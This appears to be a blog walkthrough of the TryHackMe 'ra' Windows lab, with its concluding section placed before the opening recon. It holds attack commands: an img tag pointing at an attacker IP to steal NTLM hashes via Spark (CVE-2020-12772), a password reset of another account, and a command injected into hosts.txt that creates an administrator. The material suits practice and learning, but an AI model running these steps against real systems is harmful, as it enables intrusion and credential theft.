+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">$Body</span> = <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> has not responded for 5 pings at </span><span style="color:#8be9fd;font-style:italic">$Now</span><span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>                 -Subject <span style="color:#f1fa8c">&#34;Host </span><span style="color:#8be9fd;font-style:italic">$_</span><span style="color:#f1fa8c"> is down&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpserver</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Report to screen the details</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$log</span> = <span style="color:#f1fa8c">&#34;Last run: </span>$(<span style="color:#8be9fd;font-style:italic">Get-Date</span>)<span style="color:#f1fa8c">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">write-host</span> <span style="color:#8be9fd;font-style:italic">$log</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Set-Content</span> -Path C:\scripts\log.txt -Value <span style="color:#8be9fd;font-style:italic">$log</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Available count:&#34;</span><span style="color:#8be9fd;font-style:italic">$available</span>.count
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Not available count:&#34;</span><span style="color:#8be9fd;font-style:italic">$notavailable</span>.count
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Not available hosts:&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$OutageHosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Write-Host</span> <span style="color:#f1fa8c">&#34;Sleeping </span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span><span style="color:#f1fa8c"> seconds&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">sleep </span><span style="color:#8be9fd;font-style:italic">$SleepTimeOut</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$OutageHosts</span>.Count <span style="color:#ff79c6">-gt</span> <span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># If there are more than a certain number of host down in an hour abort the script.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$Exit</span> = $True
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$body</span> = <span style="color:#8be9fd;font-style:italic">$OutageHosts</span> | <span style="color:#8be9fd;font-style:italic">Out-String</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">Send-MailMessage</span> -Body <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$body</span><span style="color:#f1fa8c">&#34;</span> -to <span style="color:#8be9fd;font-style:italic">$notificationto</span> -from <span style="color:#8be9fd;font-style:italic">$notificationfrom</span> `
+</span></span><span style="display:flex;"><span>     -Subject <span style="color:#f1fa8c">&#34;More than </span><span style="color:#8be9fd;font-style:italic">$MaxOutageCount</span><span style="color:#f1fa8c"> Hosts down, monitoring aborted&#34;</span> -SmtpServer <span style="color:#8be9fd;font-style:italic">$smtpServer</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (<span style="color:#8be9fd;font-style:italic">$Exit</span> <span style="color:#ff79c6">-ne</span> $True)
+</span></span></code></pre></div><p>it looks like this code is checking the status of some hosts every 1 minute, from a file stored at <code>C:\Users\brittanycr\hosts.txt</code>.</p>
+<p>when we try to read brittanycr&rsquo;s directories, our access is denied.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/brittanycr.PNG" alt="brittanycr"  />
+</p>
+</li>
+</ul>
+<p>if we run the command <code>whoami /groups</code> as buse, we&rsquo;ll see that buse is in the group &ldquo;account operators&rdquo;.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/whoamigroups.PNG" alt="whoamigroups"  />
+</p>
+</li>
+</ul>
+<p>account operators can change passwords for other users, which means buse can change the password for brittanycr.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>net user brittanycr wEiRdP@$$W0rd1234! /domain
+</span></span></code></pre></div><p>(i chose this password because it complies with the password policy.)</p>
+<p>once the password has been changed, let&rsquo;s try to get that file at <code>C:\Users\brittanycr\hosts.txt</code>. since the checkservers.ps1 script reads from this file without being too annoying about checking what&rsquo;s in it, we&rsquo;re gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.</p>
+<p>getting in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient <span style="color:#f1fa8c">\\\\</span>windcorp.thm<span style="color:#f1fa8c">\\</span>Users -U brittanycr --password wEiRdP@<span style="color:#8be9fd;font-style:italic">$$</span>W0rd1234!
+</span></span></code></pre></div><p>navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>; net user bilal <span style="color:#f1fa8c">&#39;p*s$w0rd123&#39;</span> <span style="color:#ff79c6">/</span>add; net localgroup Administrators bilal <span style="color:#ff79c6">/</span>add
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/hosts.PNG" alt="hosts"  />
+</p>
+</li>
+</ul>
+<p>when the script performs this little maneuver, it will inadvertently create a user &ldquo;bilal&rdquo;, and add me to the Administrators group heh heh.</p>
+<p>we have to replace the previous hosts.txt file with the new one. we can do this using the <code>upload</code> command in brittanycr&rsquo;s evil winrm instance.</p>
+<p>now if we navigate to buse&rsquo;s &ldquo;scripts&rdquo; folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you&rsquo;re patient, you&rsquo;ll see the script will have run.</p>
+<p>we should now be able to access the network with our new (root) credentials.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/evilwinrmfail.PNG" alt="evilwinrmfail"  />
+</p>
+</li>
+</ul>
+<p>hmmm, evil winrm is failing to log me in. maybe we can use another tool?</p>
+<p>first, i have to check if my credentials are actually root. to do this, let&rsquo;s use <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/"  target="_blank" rel="noreferrer nofollow">crackmapexec</a>
+, a badass tool that quickly assesses the security of large AD networks. if it says we have access, i&rsquo;ll use psexec.py to log in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>crackmapexec smb windcorp.thm -u bilal -p <span style="color:#f1fa8c">&#39;p*s$w0rd123&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/pwned.PNG" alt="pwned"  />
+</p>
+</li>
+</ul>
+<p>hell yeah, <em>we&rsquo;re in</em>.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/rootflag.PNG" alt="rootflag"  />
+</p>
+</li>
+</ul>
+<p>that was a hell of a ride. from doing a bit of recon on the company&rsquo;s users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root&hellip;i guess WindCorp isn&rsquo;t unhackable after all :)</p>
+</main>
+
+
+
+
+
+<footer>
+  <div class="footer-nav">
+    
+    <a class="next" href="/posts/update/" style="float: right"
+      >next: update</a
+    >
+     
+    <a class="previous" href="/posts/overpass2/">previous</a>
+    
+  </div>
+</footer>
+
+
+
+<script defer>
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement.isContentEditable) {
+      return false;
+    }
+    if (document.activeElement.tagName == "INPUT") {
+      return false;
+    }
+    if (e.altKey || e.ctrlKey || e.shiftKey) {
+      return false;
+    }
+    var key = e.key;
+    if (key === "h") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = "/";
+    } else if (key === "t") {
+      e.preventDefault();
+      e.stopPropagation();
+      window.location.href = `https://${location.hostname}/tags`;
+    } else if (key === "i") {
+      e.preventDefault();
+      e.stopPropagation();
+      const inputs = document.querySelectorAll("input");
+      for (let i = 0; i < inputs.length; i++) {
+        if (inputs[i].offsetParent !== null) {
+          inputs[i].selectionStart = inputs[i].selectionEnd =
+            inputs[i].value.length;
+          inputs[i].focus();
+          break;
+        }
+      }
+    }
+    return false;
+  });
+</script>
+
+
+<script defer>
+  function throttle(fn, wait) {
+    var time = Date.now();
+    return function () {
+      var now = Date.now()
+      if (time + wait - now < 0) {
+        fn();
+        time = now;
+      }
+    };
+  }
+
+  function scrollHandler() {
+    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));
+
+    function scrollCallback() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+
+      
+      for (var i = 0; i < anchors.length; i++) {
+        var anchorId = anchors[i].getAttribute("id");
+        var link = document.querySelector(
+          'nav ul li a[href="#' + anchorId + '"]',
+        );
+        if (link) {
+          link.classList.remove("active-toc");
+        }
+      }
+
+      
+      for (var i = anchors.length - 1; i >= 0; i--) {
+        var offsetTop = anchors[i].offsetTop;
+        if (scrollTop > offsetTop - 75) {
+          var anchorId = anchors[i].getAttribute("id");
+          var link = document.querySelector(
+            'nav ul li a[href="#' + anchorId + '"]',
+          );
+          if (link) {
+            link.classList.add("active-toc");
+            break;
+          }
+        }
+      }
+    }
+
+    window.addEventListener(
+      "scroll",
+      throttle(scrollCallback, 300),
+    );
+  }
+  setTimeout(scrollHandler, 100);
+</script>
+
+<script defer>
+  function addCopyButtonToCodeBlocks() {
+    
+    const codeBlocks = document.querySelectorAll('code[class^="language-"]');
+
+    codeBlocks.forEach((codeBlock) => {
+      const copyButton = document.createElement("button");
+      copyButton.classList.add("copy-code-button");
+      copyButton.innerHTML = "copy";
+
+      
+      copyButton.addEventListener("click", () => {
+        
+        const elements = codeBlock.querySelectorAll(".cl");
+        let codeToCopy = "";
+        elements.forEach((element) => {
+          codeToCopy += element.innerText;
+        });
+        navigator.clipboard.writeText(codeToCopy);
+
+        
+        copyButton.innerHTML = "copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = "copy";
+        }, 1500);
+      });
+
+      
+      codeBlock.parentNode.before(copyButton);
+    });
+  }
+  setTimeout(function () {
+    addCopyButtonToCodeBlocks();
+  }, 100);
+</script><!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
+    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />
+
+    <meta name="description" content="tryhackme: ra">
+
+    
+        <title>tryhackme: ra | ༧</title>
+    
+
+    
+    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
+  </head>
+
+  <body>
+        
+        <nav>
+          <ul class="menu">
+            
+                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
+            
+                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
+            
+          </ul>
+        </nav>
+        
+
+
+
+<div id="single-header">
+  <h1>
+    tryhackme: ra
+  </h1>
+  <div id="single-meta">
+    
+    
+        <span class="datesub">jan 10, 2021 &nbsp;&nbsp; m. jan 29, 2024</span>
+      
+
+  </div>
+</div>
+
+
+
+
+<main><p>as i&rsquo;ve been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i&rsquo;ve had to take time away from it to keep practicing all that i&rsquo;ve learned so far. &ldquo;ra&rdquo; happened to be the most challenging room i&rsquo;ve done until now, but i&rsquo;m sure there are more to come, that take even more skills into account.</p>
+<p>the story with the room is that there&rsquo;s a mega corporation called WindCorp, and they like to brag about the fact that they&rsquo;re &ldquo;unhackable&rdquo;. in this story, we&rsquo;re a hacker trying to make them eat their words, and we&rsquo;ll be exploiting a windows machine that we&rsquo;ve spotted.</p>
+<p>as usual, we get a target IP address: <code>10.10.75.59</code></p>
+<p>and again, we&rsquo;ll start off with an nmap scan (and save the results):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
+</span></span></code></pre></div><p>i&rsquo;ll trim the fat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>53/tcp   open  domain              Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp   open  http                Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec        Microsoft Windows Kerberos <span style="color:#ff79c6">(</span>server time: 2021-10-27 18:06:06Z<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc               Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp  open  ldap                Microsoft Windows Active Directory LDAP <span style="color:#ff79c6">(</span>Domain: windcorp.thm0., Site: Default-First-Site-Name<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 <span style="color:#ff79c6">(</span>SSDP/UPnP<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl?
+</span></span><span style="display:flex;"><span>2179/tcp open  vmrdp?
+</span></span><span style="display:flex;"><span>3268/tcp open  ldap                Microsoft Windows Active Directory LDAP <span style="color:#ff79c6">(</span>Domain: windcorp.thm0., Site: Default-First-Site-Name<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl?
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server       Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+</span></span><span style="display:flex;"><span>5269/tcp open  xmpp                Wildfire XMPP Client
+</span></span><span style="display:flex;"><span>7070/tcp open  http                Jetty 9.4.18.v20190429
+</span></span><span style="display:flex;"><span>7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
+</span></span><span style="display:flex;"><span>7777/tcp open  socks5              <span style="color:#ff79c6">(</span>No authentication; connection failed<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>9090/tcp open  zeus-admin?
+</span></span><span style="display:flex;"><span>9091/tcp open  ssl/xmltec-xmlmail?
+</span></span></code></pre></div><p>we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.</p>
+<p>i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name).</p>
+<p>let&rsquo;s visit <a href="http://windcorp.thm"  target="_blank" rel="noreferrer nofollow">http://windcorp.thm</a>
+.</p>
+<p>the search bar on the site doesn&rsquo;t work, but the &ldquo;reset password&rdquo; link does.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/resetpassword.PNG" alt="reset"  />
+</p>
+</li>
+</ul>
+<p>i have no idea how to fill in these fields, so i&rsquo;m going to continue digging around the site.</p>
+<p>scrolling down a bit, and we can see a list of employees:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-s" data-lang="s"><span style="display:flex;"><span>Antonietta Vidal
+</span></span><span style="display:flex;"><span>Britney Palmer
+</span></span><span style="display:flex;"><span>Brittany Cruz
+</span></span><span style="display:flex;"><span>Carla Meyer
+</span></span><span style="display:flex;"><span>Buse Candan
+</span></span><span style="display:flex;"><span>Edeltraut Daub
+</span></span><span style="display:flex;"><span>Edward Lewis
+</span></span><span style="display:flex;"><span>Emile Lavoie
+</span></span><span style="display:flex;"><span>Emile Henry
+</span></span><span style="display:flex;"><span>Emily Anderson
+</span></span><span style="display:flex;"><span>Hemmo Boschma
+</span></span><span style="display:flex;"><span>Isabella Hughes
+</span></span><span style="display:flex;"><span>Isra Saur
+</span></span><span style="display:flex;"><span>Jackson Vasquez
+</span></span><span style="display:flex;"><span>Jaqueline Dittmer
+</span></span><span style="display:flex;"><span>Emily Jensen
+</span></span><span style="display:flex;"><span>Lily Levesque
+</span></span><span style="display:flex;"><span>Kirk Uglas
+</span></span></code></pre></div><p>let&rsquo;s save these names to a file (users.txt), then break up the names so we can search the site&rsquo;s source to see if they pop in any form anywhere else.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat users.txt | tr -s <span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#f1fa8c">&#39;\n&#39;</span> &gt; userslist.txt
+</span></span></code></pre></div><p>the output (userslist.txt) now looks like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Antonietta
+</span></span><span style="display:flex;"><span>Vidal
+</span></span><span style="display:flex;"><span>Britney
+</span></span><span style="display:flex;"><span>Palmer
+</span></span><span style="display:flex;"><span>Brittany
+</span></span><span style="display:flex;"><span>Cruz
+</span></span><span style="display:flex;"><span>Carla
+</span></span><span style="display:flex;"><span>Meyer
+</span></span><span style="display:flex;"><span>Buse
+</span></span><span style="display:flex;"><span>Candan
+</span></span><span style="display:flex;"><span>Edeltraut
+</span></span><span style="display:flex;"><span>Daub
+</span></span><span style="display:flex;"><span>Edward
+</span></span><span style="display:flex;"><span>Lewis
+</span></span><span style="display:flex;"><span>Emile
+</span></span><span style="display:flex;"><span>Lavoie
+</span></span><span style="display:flex;"><span>Emile
+</span></span><span style="display:flex;"><span>Henry
+</span></span><span style="display:flex;"><span>Emily
+</span></span><span style="display:flex;"><span>Anderson
+</span></span><span style="display:flex;"><span>Hemmo
+</span></span><span style="display:flex;"><span>Boschma
+</span></span><span style="display:flex;"><span>Isabella
+</span></span><span style="display:flex;"><span>Hughes
+</span></span><span style="display:flex;"><span>Isra
+</span></span><span style="display:flex;"><span>Saur
+</span></span><span style="display:flex;"><span>Jackson
+</span></span><span style="display:flex;"><span>Vasquez
+</span></span><span style="display:flex;"><span>Jaqueline
+</span></span><span style="display:flex;"><span>Dittmer
+</span></span><span style="display:flex;"><span>Emily
+</span></span><span style="display:flex;"><span>Jensen
+</span></span><span style="display:flex;"><span>Lily
+</span></span><span style="display:flex;"><span>Levesque
+</span></span><span style="display:flex;"><span>Kirk
+</span></span><span style="display:flex;"><span>Uglas
+</span></span></code></pre></div><p>now let&rsquo;s feed this list to a <code>curl</code> command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>curl http://windcorp.thm | egrep -i -f userslist.txt
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/curlingusers.PNG" alt="curlingusers"  />
+</p>
+</li>
+</ul>
+<p>we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was <strong>lilyleAndSparky.jpg</strong>.</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/employees.PNG" alt="employees"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/employees2.PNG" alt="employees2"  />
+</p>
+</p>
+</li>
+</ul>
+<p>could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name &ldquo;sparky&rdquo; (probably her dog&rsquo;s name). one of the security questions was &ldquo;what is/was your favorite pets name?&rdquo;. let&rsquo;s try it.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/lilylepassword.PNG" alt="lilylepassword"  />
+</p>
+</li>
+</ul>
+<p>wow, it actually worked. which is good, because if it didn&rsquo;t i would really not know what to do next and would have to rethink my whole attack.</p>
+<p>armed with these credentials (lilyle:ChangeMe#1234), let&rsquo;s enumerate the SMB shares and try to log into one of them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient -L 10.10.75.59 -U lilyle
+</span></span></code></pre></div><p>enter the password when prompted.</p>
+<p>we can also use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/smbenumeration.PNG" alt="smbenumeration"  />
+</p>
+</li>
+</ul>
+<p>let&rsquo;s try to login to the &ldquo;Shared&rdquo; share.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbclient <span style="color:#f1fa8c">\\\\</span>10.10.75.59<span style="color:#f1fa8c">\\</span>Shared -U lilyle --password ChangeMe#1234
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/smblogin&#43;flag1.PNG" alt="smblogin"  />
+</p>
+</li>
+</ul>
+<p>we can see there&rsquo;s a flag stored right there, along with installers for an application called &ldquo;spark&rdquo;.</p>
+<p>let&rsquo;s download both the flag, and the .deb installer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>get <span style="color:#f1fa8c">&#34;Flag 1.txt&#34;</span>
+</span></span><span style="display:flex;"><span>get spark_2_8_3.deb
+</span></span></code></pre></div><p>if the installer is too big for your network connection, the connection will timeout. in that case, you can try <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -u <span style="color:#f1fa8c">&#34;windcorp.thm\lilyle:ChangeMe#1234&#34;</span> smb://windcorp.thm/Shared/spark_2_8_3.deb
+</span></span></code></pre></div><p>this didn&rsquo;t work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn&rsquo;t work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn&rsquo;t matter, but in a real-life scenario, versions are often very important, and some exploits don&rsquo;t work with later versions of applications.</p>
+<p>once you&rsquo;ve downloaded spark, try to get some info on the package.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>dpkg-deb -I spark_2_8_3.deb
+</span></span></code></pre></div><ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/sparkinfo.PNG" alt="sparkinfo"  />
+</p>
+</li>
+</ul>
+<p>it&rsquo;s a &ldquo;cross-platform real-time collaboration client optimized for business and organizations&rdquo;.</p>
+<p>basically, it&rsquo;s an IM client or chat app.</p>
+<p>when it&rsquo;s installed, try to use the credentials lilyle:ChangeMe#1234 to log in.</p>
+<p>the login fails, because the app wasn&rsquo;t able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option &ldquo;accept all certificates&rdquo; and disable &ldquo;certificate hostname verification&rdquo;.</p>
+<p>now, we can log in.</p>
+<p>we see there&rsquo;s a conference room, but no one is in it. the app looks pretty empty.</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/spark_room.PNG" alt="spark_room"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/sparkempty.PNG" alt="sparkempty"  />
+</p>
+</p>
+</li>
+</ul>
+<p>when dealing with apps like this, it&rsquo;s good practice to start searching vuln databases to see if any exploit exists. a good place to check is <a href="https://attackerkb.com/"  target="_blank" rel="noreferrer nofollow">https://attackerkb.com/</a>
+</p>
+<p>searching for &ldquo;spark exploits&rdquo; leads us to CVE-2020-12772.</p>
+<ul>
+<li><p class="imgp">
+  <img loading="lazy" src="/attackerkb.PNG" alt="attackerkb"  />
+</p>
+</li>
+</ul>
+<p>in a nutshell, this exploit allows us to send an &ldquo;image&rdquo; to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we&rsquo;ll need to run Responder.py.</p>
+<p>now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user &ldquo;buse&rdquo; is online. let&rsquo;s target them.</p>
+<p>first, run responder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/opt/Responder/Responder.py
+</span></span></code></pre></div><p>now, send the following &ldquo;image&rdquo; to buse:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&lt;img <span style="color:#8be9fd;font-style:italic">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://10.9.6.194/bilal.jpg&gt;
+</span></span></span></code></pre></div><p>wait for buse to click the link&hellip;</p>
+<ul>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/responder.PNG" alt="responder"  />
+</p>
+</p>
+</li>
+<li>
+<p><p class="imgp">
+  <img loading="lazy" src="/sparkexploit.PNG" alt="sparkexploit"  />
+</p>
+</p>
+</li>
+</ul>
+<p>we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):</p>
